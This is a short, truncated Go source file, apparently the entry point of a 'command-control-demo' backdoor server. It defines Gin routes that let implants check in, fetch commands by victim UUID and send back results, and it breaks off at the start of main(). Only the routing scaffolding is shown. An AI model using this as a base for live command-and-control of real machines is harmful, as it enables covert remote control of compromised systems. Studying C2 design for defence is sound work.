package main

import (
	"fmt"
	"os"
	"strings"
	"github.com/gin-gonic/gin"
	"SafeDp/backdoor/command-control-demo/server/cli"
	"SafeDp/backdoor/command-control-demo/server/models"
	"SafeDp/backdoor/command-control-demo/server/routes"
)

func setupRouter() *gin.Engine {
	r := gin.Default()
	r.POST("/ping", routes.Ping)
	r.POST("/cmd/:uuid", routes.GetCommand)
	r.POST("/send_result/:uuid/", routes.SendResult)
	return r
}

func main() {